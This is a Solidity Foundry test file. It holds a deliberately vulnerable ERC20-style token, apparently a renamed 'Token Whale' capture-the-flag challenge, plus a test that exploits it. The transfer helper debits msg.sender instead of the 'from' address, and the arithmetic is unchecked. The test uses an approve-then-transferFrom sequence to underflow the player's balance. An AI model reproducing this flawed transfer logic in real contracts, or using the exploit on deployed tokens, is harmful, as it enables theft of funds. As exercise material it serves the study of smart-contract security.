pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract ContractTest is Test {
    GamecoinWhaleChallenge GoldtokenWhaleChallengeContract;

    function testCalculation() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        GoldtokenWhaleChallengeContract = new GamecoinWhaleChallenge();
        GoldtokenWhaleChallengeContract.GoldtokenWhaleDeploy(address(this));
        console.log(
            "Player balance:",
            GoldtokenWhaleChallengeContract.gemtotalOf(address(this))
        );
        GoldtokenWhaleChallengeContract.sendGold(address(alice), 800);

        vm.prank(alice);
        GoldtokenWhaleChallengeContract.permitTrade(address(this), 1000);
        GoldtokenWhaleChallengeContract.giveitemsFrom(
            address(alice),
            address(bob),
            500
        );

        console.log("operate completed, balance calculate");
        console.log(
            "Player balance:",
            GoldtokenWhaleChallengeContract.gemtotalOf(address(this))
        );
    }

    receive() external payable {}
}

contract GamecoinWhaleChallenge {
    address player;

    uint256 public worldSupply;
    mapping(address => uint256) public gemtotalOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function GoldtokenWhaleDeploy(address _player) public {
        player = _player;
        worldSupply = 1000;
        gemtotalOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return gemtotalOf[player] >= 1000000;
    }

    event TradeLoot(address indexed from, address indexed to, uint256 value);

    function _sharetreasure(address to, uint256 value) internal {
        gemtotalOf[msg.sender] -= value;
        gemtotalOf[to] += value;

        emit TradeLoot(msg.sender, to, value);
    }

    function sendGold(address to, uint256 value) public {
        require(gemtotalOf[msg.sender] >= value);
        require(gemtotalOf[to] + value >= gemtotalOf[to]);

        _sharetreasure(to, value);
    }

    event Approval(
        address indexed guildLeader,
        address indexed spender,
        uint256 value
    );

    function permitTrade(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function giveitemsFrom(address from, address to, uint256 value) public {
        require(gemtotalOf[from] >= value);
        require(gemtotalOf[to] + value >= gemtotalOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _sharetreasure(to, value);
    }
}